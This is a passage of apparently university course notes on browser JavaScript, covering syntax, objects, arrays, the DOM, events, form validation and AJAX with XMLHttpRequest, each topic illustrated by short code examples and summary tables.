**Cannot (browser security restrictions):**
- Open new windows except in response to user-initiated events (anti-popup-abuse)
- Close windows it did not open (without user confirmation)
- Read/modify content from other browser tabs/windows (same-origin policy)
- Register event listeners on pages in different tabs/windows

### Adding JavaScript to a Page

```html
<!-- Embedded -->
<script>
  // JavaScript code here
</script>

<!-- External file (preferred) -->
<script src="my_script.js"></script>
```

**Advantages of external scripts:**
- Separates content (HTML) from behavior (JS)
- Single copy shared across multiple pages
- Downloaded once and cached by browser
- Can reference code from other servers via URL

### Script Execution and Placement

- Scripts are loaded and executed **in the order they appear** in the document
- When browser encounters `<script>`, it **stops parsing** and executes the script immediately
- **Preferred placement:** end of `<body>` (just before `</body>`) — DOM is fully parsed
- **Alternative:** `<head>` — needed when script must run before body loads

Scripts share the same global scope: variables and functions defined in one script are visible to all subsequent scripts.

---

## JavaScript Syntax

### Case Sensitivity and Comments

JavaScript is **case-sensitive**. `document.getElementById` ≠ `Document.GetElementById`.

HTML is not case-sensitive, but many client-side JavaScript objects and properties mirror HTML tags and attributes and must typically be written in lowercase.

```javascript
// Single-line comment

/*
 * Multi-line comment.
 * Cannot be nested.
 */
```

### Semicolons

Semicolons separate statements. Can be omitted between statements on separate lines, but this leads to surprises:

```javascript
// Dangerous — interpreted as: var y = x + f(a+b).toString()
var y = x + f
(a+b).toString()

// Intended — two separate statements:
var y = x + f;
(a+b).toString();
```

> [!Warning] Automatic Semicolon Insertion
> JavaScript inserts semicolons automatically in some cases, but the rules are subtle. The example above is parsed as `var y = x + f(a+b).toString()` — `f` is called with `(a+b)`.
> **Mitigazione:** Always use explicit semicolons.

### Data Types

Two categories:

| Category | Types |
|----------|-------|
| **Primitive** | `number`, `string`, `boolean`, `null`, `undefined` |
| **Object** | Arrays, functions, and everything else |

The JavaScript interpreter performs **automatic garbage collection**.

### Variables

```javascript
var i;           // declared, value is undefined
var sum;
var message = "hello";   // declaration + initialization
```

Undeclared variables can cause errors; in the slides, variables are declared with `var`.

### Numbers

All numbers in JavaScript are **floating-point** (no integer/float distinction):

```javascript
var a = 5;
var pi = 3.14;
```

- Arithmetic: `+`, `-`, `*`, `/`, `%` (modulo)
- Complex math: `Math` object (`Math.sqrt()`, `Math.floor()`, etc.)

### Strings

Zero-based indexing. Single or double quotes:

```javascript
var a = 'Hello';
var b = "bye";
var c = a + " " + b;    // concatenation with +
```

Escape sequences with `\` (e.g., `\'`, `\"`, `\n`, `\t`).

### Booleans

```javascript
var a = true;
var b = false;
```

- Operators: `&&` (AND), `||` (OR), `!` (NOT)
- `toString()` converts to `"true"` / `"false"`

### Null and Undefined

| Value | Meaning |
|-------|---------|
| `null` | Explicit absence of value — language keyword |
| `undefined` | Variable declared but not initialized; or accessing non-existent property/array element |

Both indicate absence of value and can often be used interchangeably.

### Statements

Standard control flow:

```javascript
var, if/else, else if, switch, while, do/while, for, break, continue, return, throw, try/catch
```

---

## JavaScript Objects

> [!Important] JavaScript Objects — Associative Arrays
> JavaScript objects are **associative arrays** (maps of name→value pairs).
> Unlike Java/C++, you can add any number of properties to any object at runtime — no fixed schema required.
>
> Property access:
> ```javascript
> object.property        // dot notation
> object["property"]     // bracket notation (allows dynamic keys)
> ```

### Object Literals

```javascript
var o = {
  data_prop1: value1,
  data_prop2: value2,
  method_1() { /* body */ },
  method_2(value) { /* body */ }
};

// Built-in constructors
var a = new Array();
var d = new Date();
```

### Constructor Functions

For creating multiple instances of the same type:

```javascript
function Person(first, last, age, eye) {
  this.firstName = first;
  this.lastName  = last;
  this.age       = age;
  this.eyeColor  = eye;
  this.plusOne   = function() { this.age = this.age + 1; };
  this.name      = function() {
    return this.firstName + " " + this.lastName;
  };
}

var myFather = new Person("John", "Doe", 50, "blue");
var myMother = new Person("Sally", "Rally", 48, "green");

// Usage:
document.getElementById("demo").innerHTML = "My father is " + myFather.name();
```

### this Keyword

```javascript
var person = {
  firstName: "John",
  lastName : "Doe",
  id       : 5566,
  fullName : function() {
    return this.firstName + " " + this.lastName;
  }
};
```

Inside a function, `this` refers to the **owner** of the function — the object that invoked it. `this.firstName` refers to the `firstName` property of the current instance.

### Deleting Properties

```javascript
var book = {
  title: "JavaScript for Kids",
  subtitle: "A Playful Introduction",
  audience: "children"
};

delete book.audience;   // removes property entirely (not just its value)
```

`delete` returns `true` if successful or if it had no effect.

---

## Arrays

### Creating and Accessing Arrays

JavaScript arrays are **dynamic** (auto-resize), **heterogeneous** (mixed types allowed):

```javascript
var empty  = [];
var primes = [2, 3, 5, 7, 11];
var misc   = [1.1, true, "a"];
var nest   = [[1, {x:1, y:2}], [2, {x:3, y:4}]];   // nested

var v_0 = new Array();          // empty
var v_1 = new Array(10);        // length 10, elements undefined
var v_2 = new Array(5,4,3,2,1); // [5,4,3,2,1]
```

Access and iteration:

```javascript
a[0]         // first element (zero-based)
a.length     // number of elements

for (var i = 0; i < a.length; i++) {
  // process a[i]
}
```

### Array Methods

| Method | Description |
|--------|-------------|
| `join(sep)` | Converts elements to strings, concatenates with separator |
| `reverse()` | Reverses in place, returns reversed array |
| `sort()` | Sorts in place, returns sorted array |
| `concat(arr)` | Returns new array with elements of original + arguments |
| `slice(start, end)` | Returns portion of array |
| `push(el)` / `pop()` | Add/remove at end |
| `shift()` / `unshift(el)` | Remove/add at start |
| `indexOf(val)` | First index of value, or -1 |

### forEach

```javascript
var data = [1, 2, 3, 4, 5];
var sum  = 0;

// Single argument: element value
data.forEach(function(value) { sum += value; });

// Three arguments: value, index, array
data.forEach(function(v, i, a) { a[i] = v + 1; });
```

`forEach()` iterates all elements, invoking the callback with `(value, index, array)`.

---

## Functions

```javascript
function addNumbers() {
  return 2 + 2;
}

function addNumbers(a, b) {
  return a + b;
}
```

Defined with the `function` keyword, followed by name, parameter list in `()`, body in `{}`.

---

## Browser Objects

### The Window Object

`window` represents the open browser window. All global variables and functions are properties of `window`.

Key properties and methods:

| Member | Type | Purpose |
|--------|------|---------|
| `setTimeout(fn, ms)` | Method | Execute `fn` once after `ms` milliseconds |
| `setInterval(fn, ms)` | Method | Execute `fn` every `ms` milliseconds |
| `location` | Property | Current URL; can navigate by assigning |
| `history` | Property | Browser navigation history |
| `alert(msg)` | Method | Display message dialog |
| `confirm(msg)` | Method | Display OK/Cancel dialog → boolean |
| `prompt(msg)` | Method | Display input dialog → string |
| `navigator` | Property | Browser info (name, version, platform) |
| `screen` | Property | Display size and color depth |
| `document` | Property | The Document object (DOM root) |

### Dialog Boxes

```javascript
// Alert — waits for user to dismiss
alert("Hello, " + name);

// Confirm — returns true (OK) or false (Cancel)
var correct = confirm("You entered '" + name + "'.\nClick OK to proceed.");

// Prompt — returns entered string
var name = prompt("What is your name?");

// Combined usage
do {
  var name    = prompt("What is your name?");
  var correct = confirm("You entered '" + name + "'.\n" +
                        "Click Okay to proceed or Cancel to re-enter.");
} while (!correct);
alert("Hello, " + name);
```

### Timers

```javascript
// One-shot: run fn once after 2000ms
var id = setTimeout(function() { doSomething(); }, 2000);

// Repeating: run fn every 1000ms
var id = setInterval(function() { updateClock(); }, 1000);
```

### Navigator and Screen

```javascript
navigator.appName     // browser name
navigator.appVersion  // browser version
navigator.userAgent   // User-Agent string (sent in HTTP header)
navigator.platform    // operating system

screen.width          // display width in pixels
screen.height         // display height in pixels
screen.colorDepth     // color depth
```

### The Console Object

Used for debugging (browser DevTools console):

| Method | Purpose |
|--------|---------|
| `console.log(msg)` | Output general message |
| `console.info(msg)` | Informational message |
| `console.warn(msg)` | Warning |
| `console.error(msg)` | Error |
| `console.trace()` | Message + stack trace |
| `console.debug(msg)` | Debug-level message |
| `console.time(label)` / `timeEnd(label)` | Measure elapsed time |
| `console.assert(expr, msg)` | Log if `expr` is false |
| `console.dir(obj)` | Log DOM/JS object representation |
| `console.table(arr)` | Log array of objects as table |

### Browser Developer Tools

The slides show Chrome and Firefox Developer Tools as the practical environment for inspecting pages and using the debugging console exposed through the `console` object.

---

## The Document Object Model (DOM)

> [!Important] DOM — Document Object Model
> Every `Window` object has a `document` property pointing to a **Document object** — the in-memory tree representation of the HTML page.
>
> The DOM is the **fundamental API** for representing and manipulating HTML content from JavaScript.
>
> **Intuition:** When the browser parses HTML, it builds a tree of objects in memory. JavaScript can walk this tree, read it, and modify it — changes immediately reflect in the rendered page.

### DOM Structure

![[js-dom-tree.jpg|560]]
*Figure 1: DOM tree generated from the structure of an HTML document*

The DOM represents HTML as a **tree of nodes**:

| Node type | `nodeType` | Description |
|-----------|-----------|-------------|
| `Document` | 9 | Root of the entire tree |
| `Element` | 1 | Represents HTML tags |
| `Text` | 3 | Text content inside elements |
| `Comment` | 8 | HTML comments |
| `DocumentFragment` | 11 | Lightweight document fragment |

`Document`, `Element`, and `Text` are all subclasses of `Node`.

### Node Properties

```javascript
node.parentNode               // parent node
node.childNodes               // NodeList of all children
node.firstChild               // first child node
node.lastChild                // last child node
node.nextSibling              // next sibling node
node.previousSibling          // previous sibling node
node.nodeType                 // integer type code
node.nodeValue                // text content (Text/Comment nodes)
node.nodeName                 // uppercase tag name (Element) or "#text"

// Element-only properties (skip Text nodes):
element.children              // only Element children
element.firstElementChild
element.lastElementChild
element.nextElementSibling
element.previousElementSibling
element.childElementCount
```

### Selecting Elements

| Method | Returns | Selects by |
|--------|---------|-----------|
| `document.getElementById("id")` | Single `Element` | Unique `id` attribute |
| `document.getElementsByName("name")` | `NodeList` | `name` attribute |
| `document.getElementsByTagName("tag")` | `NodeList` | Tag name (e.g., `"span"`) |
| `document.getElementsByClassName("cls")` | `NodeList` | CSS class |
| `document.querySelectorAll("selector")` | `NodeList` | Any CSS selector |

```javascript
var section1    = document.getElementById("section1");
var radios      = document.getElementsByName("favorite_color");
var spans       = document.getElementsByTagName("span");
var warnings    = document.getElementsByClassName("warning");
var sidebarPara = document.querySelectorAll(".sidebar p");
var textInput   = document.querySelectorAll("input[type='text']");
```

`getElementsByName()`, `getElementsByTagName()`, `getElementsByClassName()`, and `querySelectorAll()` return `NodeList` objects that behave like read-only arrays of `Element` objects. The class-selection method can also be invoked on a specific element, as in `log.getElementsByClassName("warning")`.

### Element Properties and Attributes

```javascript
// Read attribute as property
var image  = document.getElementById("myimage");
var imgurl = image.src;                   // property access

// getAttribute / setAttribute / hasAttribute / removeAttribute
var imgurl = image.getAttribute("src");   // always returns string
image.setAttribute("src", "newimage.jpg");
image.hasAttribute("alt");
image.removeAttribute("title");
```

Note: `getAttribute()` always returns a string — never a number, boolean, or object.

### Manipulating the DOM

#### Creating Nodes

```javascript
var newDiv  = document.createElement("div");           // Element node
var ourText = document.createTextNode("Put text here."); // Text node
```

Newly created nodes are "floating" until appended to the document.

#### Inserting Nodes

```javascript
// appendChild: add as last child
var ourDiv      = document.getElementById("our-div");
var newParagraph = document.createElement("p");
var newText      = document.createTextNode("Hello, world!");
newParagraph.appendChild(newText);    // text into p
ourDiv.appendChild(newParagraph);     // p into div

// insertBefore: add before a specific child
var para       = document.getElementById("our-paragraph");
var newHeading = document.createElement("h1");
var headingText = document.createTextNode("A new heading");
newHeading.appendChild(headingText);
ourDiv.insertBefore(newHeading, para);   // insert h1 before para
```

#### Removing and Replacing Nodes

```javascript
// removeChild: called on parent, pass child to remove
var parentDiv  = document.getElementById("parent");
var removeEl   = document.getElementById("removable_element");
parentDiv.removeChild(removeEl);

// replaceChild: called on parent (newNode, oldNode)
var swap_el = document.getElementById("swap-me");
var newImg  = document.createElement("img");
newImg.setAttribute("src", "path/to/image.jpg");
parentDiv.replaceChild(newImg, swap_el);

// Dynamic script loading example
function loadasync(url) {
  var head = document.getElementsByTagName("head")[0];
  var s    = document.createElement("script");
  s.src    = url;
  head.appendChild(s);
}
```

---

## Handling Events

### JavaScript Timeline

Four phases of execution:

1. **Parsing** — browser creates `Document` object, begins parsing HTML
2. **Script execution** — when `<script>` elements are encountered, scripts execute **synchronously**; parser pauses while script downloads/runs
3. **Document complete** — document fully parsed; browser may still load images etc. When all resources load and all scripts have run, `document.readyState` → `"complete"` and browser fires `load` event on `Window`
4. **Event-driven phase** — event handlers invoked **asynchronously** in response to user input, network events, timers, etc.

### Events, Types, Targets

| Concept | Description |
|---------|-------------|
| **Event** | An occurrence the browser notifies JS about |
| **Event type** | String naming the kind of event: `"click"`, `"keydown"`, `"load"` |
| **Event target** | Object on which event occurred: `Window`, `Document`, or `Element` |

Must always specify both type AND target: "a `click` event on a `<button>` Element".

### Event Handlers and Objects

**Event handler** (= event listener) — function registered to respond to a specific event type on a specific target.

**Event object** — passed as argument to handler; always has:
- `type` — string specifying event type
- `target` — reference to the event target

Each event type defines additional properties (e.g., mouse event includes mouse coordinates).

### Mouse Events

In the early Web, browsers supported only a small event set such as `load`, `click`, and `mouseover`. The number of events grew through DOM Level 3 Events, new APIs in HTML5, and touch-based/mobile devices.

| Event | Trigger |
|-------|---------|
| `mousemove` | Mouse moves/drags |
| `mousedown` | Mouse button pressed |
| `mouseup` | Mouse button released |
| `click` | Full click (mousedown + mouseup) on any element |
| `dblclick` | Two clicks in quick succession |
| `mouseover` | Mouse enters element |
| `mouseout` | Mouse leaves element |
| `mousewheel` | Mouse wheel rotated |

### Key Events

| Event | Trigger |
|-------|---------|
| `keydown` | Key pressed (low-level) |
| `keyup` | Key released |
| `keypress` | Fired after `keydown` when a printable character is generated |

Keyboard events fire on focused element and **bubble** up to `document` and `window`.

### Form Events

| HTML Element | Events |
|-------------|--------|
| `<input type="button">`, `<button type="button">` | `onclick` |
| `<input type="checkbox">` | `onchange`, `onclick` |
| `<input type="text/password/file">` | `onchange` |
| `<input type="radio">` | `onchange`, `onclick` |
| `<input type="reset">` | `onclick`, `onreset` |
| `<select>` | `onchange` |
| `<input type="submit">` | `onclick`, `onsubmit` |
| `<textarea>` | `onchange` |

Key form-level handlers:
- `onsubmit` — fired just before form submission; **return `false`** to cancel
- `onreset` — fired just before form reset; **return `false`** to cancel
- `focus` / `blur` — element gains/loses keyboard focus
- `change` — value changes AND focus moves away (not fired on every keystroke)

### Window Events

| Event | Trigger |
|-------|---------|
| `load` | Document and all external resources fully loaded |
| `unload` | User navigating away from page |
| `beforeunload` | Like `unload` but allows asking user confirmation |
| `resize` | Browser window resized |
| `scroll` | Browser window scrolled |

### Registering Event Handlers

Three approaches:

#### 1. Event handler property (JavaScript)

```javascript
window.onload = function() {
  var elt = document.getElementById("address");
  elt.onsubmit = function() { return validate(this); };
};
```

Limitation: only one handler per event per element.

#### 2. HTML attribute (avoid)

```html
<button onclick="alert('Thank you');">Click Here</button>
```

Mixes HTML and JS behavior. **Avoid** — breaks separation of concerns.

#### 3. `addEventListener()` (preferred)

The slides also mention `attachEvent()` as the older registration method used by IE8/IE9.

```javascript
var b = document.getElementById("mybutton");

// Old style (only one handler):
b.onclick = function() { alert("Thanks!"); };

// Modern style (multiple handlers, preferred):
b.addEventListener("click", function() { alert("Thanks again!"); });
```

> [!Important] addEventListener() vs Property Assignment
> ```javascript
> target.addEventListener(eventType, handlerFunction);
> target.removeEventListener(eventType, handlerFunction);
> ```
> - `eventType`: string **without** the `"on"` prefix (e.g., `"click"` not `"onclick"`)
> - Allows **multiple handlers** for same event on same element
> - Finer control: capturing vs. bubbling phase
> - Works on any DOM object (not just HTML elements)
> - Paired with `removeEventListener()` for cleanup
>
> **Intuition:** Use `addEventListener` always — it's the standard, supports multiple handlers, and doesn't conflict with other libraries.

> [!Example] Temporarily registered event handlers
> **Contesto:** `removeEventListener()` removes a handler that was registered earlier.
> **Codice:**
> ```javascript
> document.removeEventListener("mousemove", handleMouseMove);
> document.removeEventListener("mouseup", handleMouseUp);
> ```

---

## Summary Table

| Concept | Key API / Syntax | Notes |
|---------|-----------------|-------|
| **Embed script** | `<script>` / `<script src="...">` | Prefer external; place at end of `<body>` |
| **Variable** | `var name = value;` | Uninitialized → `undefined` |
| **Object literal** | `{ key: val, method() {} }` | Dynamic properties; associative array |
| **Constructor** | `function Type() { this.x = ... }` + `new Type()` | Reusable object blueprint |
| **`this`** | — | Refers to owning object in method context |
| **Array** | `[]` or `new Array()` | Dynamic, heterogeneous; zero-indexed |
| **`forEach`** | `arr.forEach(fn)` | `fn(value, index, array)` |
| **`window`** | Global browser object | All globals are window properties |
| **Timers** | `setTimeout(fn, ms)` / `setInterval(fn, ms)` | Async deferred/repeating execution |
| **DOM root** | `window.document` | `Document` object = entry to DOM tree |
| **Select by id** | `document.getElementById("id")` | Simplest and most common; id must be unique |
| **Select by CSS** | `document.querySelectorAll("selector")` | Full CSS selector support |
| **Create node** | `document.createElement("tag")` | Floating until appended |
| **Insert node** | `parent.appendChild(node)` / `insertBefore(new, ref)` | — |
| **Remove node** | `parent.removeChild(child)` | Called on parent |
| **Replace node** | `parent.replaceChild(newNode, oldNode)` | Called on parent |
| **Attribute read** | `element.getAttribute("attr")` | Always returns string |
| **Attribute write** | `element.setAttribute("attr", "val")` | — |
| **Register event** | `target.addEventListener("type", fn)` | Preferred; multiple handlers |
| **Remove event** | `target.removeEventListener("type", fn)` | Same type+fn reference required |
| **Form submit cancel** | `onsubmit` handler returning `false` | Cancels form submission |
| **Node types** | Document=9, Element=1, Text=3 | `node.nodeType` |

## Questions

1. How do HTML, CSS, and JavaScript divide responsibilities in a web page?
2. Why is JavaScript's relationship to Java mostly historical and marketing-based rather than technical?
3. What can browser JavaScript do to the current page, and what restrictions protect other tabs, windows, and origins?
4. Why are external scripts and placement near the end of `<body>` usually preferred?
5. What problems can Automatic Semicolon Insertion create, and why is explicit semicolon use safer?
6. How do primitive values, objects, arrays, and functions differ in JavaScript's type model?
7. Why are JavaScript objects described as associative arrays, and when would bracket notation be more useful than dot notation?
8. How do constructor functions and the `this` keyword work together to create reusable object instances?
9. What makes JavaScript arrays dynamic and heterogeneous, and how do methods such as `push`, `pop`, `slice`, `sort`, and `forEach` support common operations?
10. How are JavaScript functions defined, and what role do parameters and `return` play?
11. How do `window`, `document`, `location`, `history`, timers, dialogs, `navigator`, `screen`, and `console` expose browser functionality?
12. How does the DOM tree represent an HTML document, and what is the difference between `Node`, `Document`, `Element`, and `Text` nodes?
13. How do DOM selection methods such as `getElementById`, `getElementsByName`, `getElementsByClassName`, and `querySelectorAll` differ?
14. What steps are required to create, insert, remove, and replace DOM nodes programmatically?
15. Why should `getAttribute()` and direct property access sometimes be treated differently?
16. How do parsing, synchronous script execution, document completion, and the event-driven phase form the JavaScript execution timeline?
17. Why is `addEventListener()` preferred over HTML event attributes or assigning `onclick` directly?
18. How does returning `false` from a submit handler stop an invalid form submission?

# Form Validation and AJAX — Web Applications 2025-26

## Table of Contents

- [[#Form Validation|Form Validation]]
  - [[#What is Form Validation?|What is Form Validation?]]
  - [[#Types of Form Validation|Types of Form Validation]]
  - [[#HTML5 Built-in Validation|HTML5 Built-in Validation]]
  - [[#Constraint Validation API|Constraint Validation API]]
  - [[#Plain JavaScript Validation|Plain JavaScript Validation]]
- [[#AJAX — Scripted HTTP|AJAX — Scripted HTTP]]
  - [[#What is AJAX?|What is AJAX?]]
  - [[#Synchronous vs Asynchronous|Synchronous vs Asynchronous]]
  - [[#XMLHttpRequest|XMLHttpRequest]]
  - [[#Specifying the Request|Specifying the Request]]
  - [[#Encoding the Request Body|Encoding the Request Body]]
  - [[#Cross-Origin Resource Sharing (CORS)|Cross-Origin Resource Sharing (CORS)]]
  - [[#Retrieving the Response|Retrieving the Response]]
  - [[#Types of Receivable Data|Types of Receivable Data]]
  - [[#Loading JSON with AJAX|Loading JSON with AJAX]]
  - [[#Fetch API|Fetch API]]
- [[#Further Readings|Further Readings]]
- [[#Summary Table|Summary Table]]

---

## Form Validation

### What is Form Validation?

**Form validation**: when a user enters data in a web page, the web application checks it to see that the data is correct. If correct, data is submitted to the server (and usually saved in a database); if not, an error message is displayed.

Three main reasons to validate forms:

1. **Correct data, correct format** — web applications break if data is stored in incorrect format or required fields are omitted
2. **User account security** — force secure passwords
3. **Application protection** — malicious users exploit unprotected forms to damage the application

### Types of Form Validation

> [!Important] Client-side vs Server-side Validation
> Two complementary validation strategies:
>
> | Type | Where | When | UX | Security |
> |------|--------|------|-----|---------|
> | **Client-side** | Browser | Before submission | Instant feedback | Not sufficient alone |
> | **Server-side** | Server | After submission | Delayed (full round-trip) | Last line of defense |
>
> **Intuition:** Client-side validation improves UX; server-side validation is mandatory for security. Always use both.

**Client-side** subdivisions:
- **JavaScript validation** — fully customizable, coded manually
- **HTML5 built-in validation** — browser-native, better performance, less customizable

**Server-side validation**: validates data before saving to DB. Not user-friendly (no errors until full form submitted), but guards against incorrect or malicious data that bypassed client-side checks.

### HTML5 Built-in Validation

HTML5 provides **validation attributes** on form elements — rules the input must satisfy.

**Validation attributes:**
- `required` — field must not be empty
- `pattern="regex"` — value must match the regular expression
- `type="email"`, `type="url"`, etc. — browser validates format automatically
- `min`, `max`, `minlength`, `maxlength` — range/length constraints

**CSS pseudo-classes** reflect validation state:

| Pseudo-class | Condition | Use |
|---|---|---|
| `:valid` | Element satisfies all constraints | Apply green border, checkmark |
| `:invalid` | Element violates at least one constraint | Apply red border, error style |

When **valid**: browser submits the form (unless blocked by JavaScript).
When **invalid**: browser blocks form submission and displays an error message.

> [!Example] HTML5 Validation with `pattern` and CSS
> **Contesto:** Input field requiring "Informatics", "ICT", or "Cybersecurity". Invalid fields get red dashed border; valid fields get black solid border.
> **Codice:**
> ```css
> input:invalid { border: 2px dashed red; }
> input:valid   { border: 2px solid black; }
> ```
> ```html
> <form>
>   <label for="choose">In which course are you enrolled?
>     Informatics or ICT?</label>
>   <input id="choose" name="course"
>          required pattern="Informatics|ICT|Cybersecurity">
>   <button>Submit</button>
> </form>
> ```
> **Spiegazione:** `required` prevents empty submission; `pattern` restricts the allowed values. The browser handles validation automatically — no JavaScript needed.

### Constraint Validation API

HTML5 provides the **constraint validation API** to check and customize form element state from JavaScript.

Key API:
- `element.validity` — object with boolean flags (e.g., `typeMismatch`, `valueMissing`, `patternMismatch`)
- `element.setCustomValidity(message)` — set a custom error message; pass `""` to clear (mark as valid)

> [!Example] Custom Error Message with `setCustomValidity()`
> **Contesto:** Change browser's default "invalid email" message to a custom string.
> **Codice:**
> ```javascript
> var email = document.getElementById("provide_email");
>
> email.addEventListener("input", function (event) {
>   if (email.validity.typeMismatch) {
>     email.setCustomValidity("Please insert an email address!");
>   } else {
>     email.setCustomValidity("");  // clear = valid
>   }
> });
> ```
> **Spiegazione:** `typeMismatch` fires when value doesn't match `type="email"` format. Passing `""` to `setCustomValidity` clears the custom error so the field becomes valid again.

### Plain JavaScript Validation

When HTML5 built-in validation is insufficient, implement manually with JavaScript.

Questions to answer when designing JS validation:
1. What validation to perform? (string ops, type conversion, regex, etc.) — form data always arrives as strings
2. What to do on failure? (highlight fields, show messages?)
3. How to guide the user? (up-front suggestions + clear error messages)

> [!Example] Email Validation with Plain JavaScript
> **Contesto:** Validate email on input and on submit. Show inline error message.
> **Codice:**
> ```html
> <div>
>   <label for="provide_email">What is your e-mail?</label>
>   <input type="text" id="provide_email" name="email">
>   <span class="error"></span>
> </div>
> ```
> ```javascript
> var form  = document.getElementsByTagName("form")[0];
> var email = document.getElementById("provide_email");
> var error = email.nextElementSibling;  // the <span>
>
> // Regex to validate email format
> var emailRegExp = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
>
> // Validate on every keystroke
> email.addEventListener("input", function () {
>   var test = email.value.length === 0 || emailRegExp.test(email.value);
>   if (test) {
>     email.className = "valid";
>     error.innerHTML = "";
>   } else {
>     email.className = "invalid";
>     error.innerHTML = "Please insert an e-mail address";
>     error.className = "error";
>   }
> });
>
> // Validate on submit — block submission if invalid
> form.addEventListener("submit", function (event) {
>   var test = email.value.length === 0 || emailRegExp.test(email.value);
>   if (test) {
>     email.className = "valid";
>     error.innerHTML = "";
>   } else {
>     email.className = "invalid";
>     error.innerHTML = "I expect an e-mail!";
>     error.className = "error active";
>     event.preventDefault();  // block form submission
>   }
> });
> ```
> **Spiegazione:** Two handlers: `input` for live feedback as user types; `submit` for final gate before submission. `event.preventDefault()` blocks the form if invalid.

---

## AJAX — Scripted HTTP

### What is AJAX?

> [!Important] AJAX Definition
> **AJAX** (*Asynchronous JavaScript And XML*) — originally named after the technologies used (JS + XML), now refers to a group of technologies enabling **asynchronous functionality** in the browser.
>
> Key feature: uses **scripted HTTP** to initiate data exchange with a web server **without causing pages to reload**.
>
> Core mechanism: **XMLHttpRequest** object (or modern **Fetch API**) — can send/receive JSON, XML, HTML, plain text.
>
> **Intuition:** Instead of reloading the whole page for every interaction, AJAX fetches only the needed data and updates just that portion of the DOM.

AJAX capabilities:
- Live search / autocomplete (e.g., Google search suggestions)
- Real-time content feeds (Twitter, Facebook)
- Shopping cart updates without page reload
- Username availability check during registration
- Logging user interaction data to the server
- Improving startup time by showing a simple page first, then downloading additional data and page components only when needed

### Synchronous vs Asynchronous

| Model | Behavior | Problem |
|-------|----------|---------|
| **Synchronous** | Browser stops processing page while script loads/executes | Blocks UI; server wait freezes everything |
| **Asynchronous** | Browser continues; server response fires an event | Non-blocking; only relevant DOM element updated |

AJAX uses **asynchronous (non-blocking)** model: user can interact with the page while waiting for server response. When server responds, an event fires and a callback function processes the data.

### XMLHttpRequest

> [!Important] XMLHttpRequest Object
> Browsers expose their HTTP API through the **XMLHttpRequest** class. Each instance = one request/response pair.
>
> ```javascript
> var request = new XMLHttpRequest();
> ```
>
> **HTTP Request** has 4 parts:
> 1. HTTP request method (`GET`, `POST`, etc.)
> 2. URL being requested
> 3. Optional request headers (may include auth)
> 4. Optional request body
>
> **HTTP Response** has 3 parts:
> 1. Numeric + textual status code (success/failure)
> 2. Set of response headers
> 3. Response body
>
> **Intuition:** XHR wraps the raw HTTP request/response cycle in a JavaScript API — same semantics as HTTP, just scriptable.

### Specifying the Request

**Step 1 — `open()`**: configure method and URL

```javascript
request.open('GET', 'http://www.example.org/some.file');
```

- First parameter: HTTP method — keep **all-capitals** (HTTP standard); some browsers reject lowercase
- Second parameter: URL — relative to current document's URL; **same-origin only** by default (cross-domain requires CORS)

**Step 2 — `setRequestHeader()`**: set optional headers

```javascript
request.setRequestHeader("Content-Type", "text/plain");
```

- POST requests require `Content-Type` header specifying MIME type of body
- Calling `setRequestHeader()` multiple times for same header **appends** values (does not replace)

**Step 3 — `send()`**: dispatch the request

```javascript
request.send();         // GET — no body
request.send(body);     // POST — body as string
```

### Encoding the Request Body

POST requests carry data in the request body. Two common encodings:

**Form-encoded** (`application/x-www-form-urlencoded`):
- URI-encode each name and value, replacing special characters with hexadecimal escape codes
- Join encoded name and value with `=`, separate pairs with `&`
- Example: `find=pizza&zipcode=02134&radius=1km`
- Set header: `Content-Type: application/x-www-form-urlencoded`

**JSON-encoded**:
```javascript
request.setRequestHeader("Content-Type", "application/json");
request.send(JSON.stringify(dataObject));
```

### Cross-Origin Resource Sharing (CORS)

> [!Important] Same-Origin Policy and CORS
> **Same-origin policy**: by default, `XMLHttpRequest` can only issue HTTP requests to the **same server** that served the page. Browsers block AJAX responses from other domains.
>
> **CORS** (*Cross-Origin Resource Sharing*): mechanism using additional **HTTP headers** that lets a user agent access resources from a **different origin** (domain/protocol/port).
>
> The server includes headers like `Access-Control-Allow-Origin` to declare which origins are permitted.
>
> Example: HTML page at `http://domain-a.com` requests `http://domain-b.com/image.jpg` — this is cross-origin; browser blocks unless domain-b.com includes CORS headers.
>
> **Note:** Cross-origin requests do **not** include user credentials (username/password, cookies, auth tokens) by default.
>
> **Intuition:** CORS is the server's opt-in mechanism to relax same-origin restrictions for trusted origins.

### Retrieving the Response

Assign a callback to `onload` before sending:

```javascript
request.onload = nameOfTheFunction;
```

**`readyState` values** (progression of request lifecycle):

| Value | Name | Meaning |
|-------|------|---------|
| `0` | Uninitialized | `open()` not called yet |
| `1` | Loading | `open()` called |
| `2` | Loaded | Response headers received |
| `3` | Interactive | Response body being received |
| `4` | Complete | Full response received and ready |

Check both `readyState` and HTTP status in callback:

```javascript
function handleResponse() {
  if (request.readyState === XMLHttpRequest.DONE) {  // 4
    if (request.status == 200) {
      // access data
      var text = request.responseText;   // response as string
      var xml  = request.responseXML;    // response as XMLDocument
    }
  }
}
```

> [!Example] Full XHR GET Request
> **Contesto:** Button click triggers AJAX GET; response shown in alert.
> **Codice:**
> ```javascript
> (function() {
>   var httpRequest;
>
>   document.getElementById('ajaxButton').addEventListener('click', makeRequest);
>
>   function makeRequest() {
>     httpRequest = new XMLHttpRequest();
>     if (!httpRequest) {
>       alert('Giving up :( Cannot create an XMLHTTP instance');
>       return false;
>     }
>     httpRequest.onload = alertContents;
>     httpRequest.open('GET', 'test.html');
>     httpRequest.send();
>   }
>
>   function alertContents() {
>     if (httpRequest.readyState === XMLHttpRequest.DONE) {
>       if (httpRequest.status == 200) {
>         alert(httpRequest.responseText);
>       } else {
>         alert('There was a problem with the request.');
>       }
>     }
>   }
> })();
> ```
> **Spiegazione:** IIFE pattern wraps everything to avoid global scope pollution. `onload` fires when response arrives; handler checks `readyState === DONE` and `status === 200` before processing.

### Types of Receivable Data

| Format | Pros | Cons |
|--------|------|------|
| **HTML** | Easy to write, request, display; goes straight into page via `innerHTML` | Server must produce page-ready HTML; no data portability |
| **XML** | Flexible, represents complex structures; works across platforms; uses DOM methods | Verbose (tags inflate file size); requires more processing code |
| **JSON** | CORS-friendly; concise; widely used with JavaScript | Strict syntax (missing quote/comma/colon breaks it); can contain malicious content — use only from trusted sources |

### Loading JSON with AJAX

JSON flow:
1. Server sends JSON as a **string**
2. Browser receives string
3. Script **deserializes**: `JSON.parse(string)` → JavaScript object
4. Script accesses data properties, builds HTML
5. HTML inserted into page via `innerHTML` *(only from trusted sources)*
